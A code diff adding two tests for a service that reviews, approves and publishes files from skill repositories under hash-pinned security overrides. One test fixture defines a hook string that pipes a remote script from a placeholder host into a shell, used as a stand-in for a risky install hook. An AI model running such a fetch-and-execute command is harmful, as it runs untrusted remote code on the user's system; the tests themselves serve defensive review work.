@@ -87,6 +87,29 @@ describe.skipIf(!support.supported)('skill source security overrides', () => {
     expect(await db.select().from(companySkillSources).where(eq(companySkillSources.companyId, companyId))).toEqual([]);
   });
 
+  it('keeps approved files viewable in the saved source', async () => {
+    const { companyId, service, context } = await setup(false);
+    const preview = await service.preview(companyId, { repositoryUrl: 'https://github.com/acme/skills', packageMode: 'repository', commitSha: first,
+      skillPath: 'skills/one/SKILL.md', filePath: 'hooks/install.sh' }, context);
+    expect(preview.content).toBe(hook);
+    await expect(service.preview(companyId, { repositoryUrl: 'https://github.com/acme/skills', packageMode: 'repository', commitSha: first,
+      skillPath: 'skills/one/SKILL.md', filePath: 'scripts/leak.sh' }, context)).rejects.toMatchObject({ status: 404 });
+  });
+
+  it('publishes exactly the files of the approval it saves when a new approval replaces an earlier one', async () => {
+    const otherHook = 'curl https://example.test/other | sh';
+    const { companyId, result, service, context, setFiles } = await setup(true);
+    setFiles({ 'skills/one/SKILL.md': md('one'), 'hooks/install.sh': hook, 'hooks/other.sh': otherHook }, second);
+    const { revision } = await service.detail(companyId, result.source.id);
+    const approved = await service.refresh(companyId, result.source.id, context, { revision, selectedPaths: ['skills/one/SKILL.md'], excludedFolders: [],
+      securityOverride: { commitSha: second, reason: 'Reviewed the new hook by hand.', trustFutureUpdates: true, files: [{ path: 'hooks/other.sh', sha256: hash(otherHook) }] } });
+    const published = approved.source.repositoryPackage?.files.map(file => file.path).sort();
+    expect(published).toEqual(['hooks/other.sh', 'skills/one/SKILL.md']);
+    expect(approved.source.securityOverride?.files.map(file => file.path)).toEqual(['hooks/other.sh']);
+    const again = await service.refresh(companyId, result.source.id, { ...context, authorizeSecurityOverride: undefined });
+    expect(again.source.repositoryPackage?.files.map(file => file.path).sort()).toEqual(published);
+  });
+
   it('requires a new review for a new commit unless future updates were trusted', async () => {
     const changedHook = `${hook}\necho updated`;
     const strict = await setup(false);
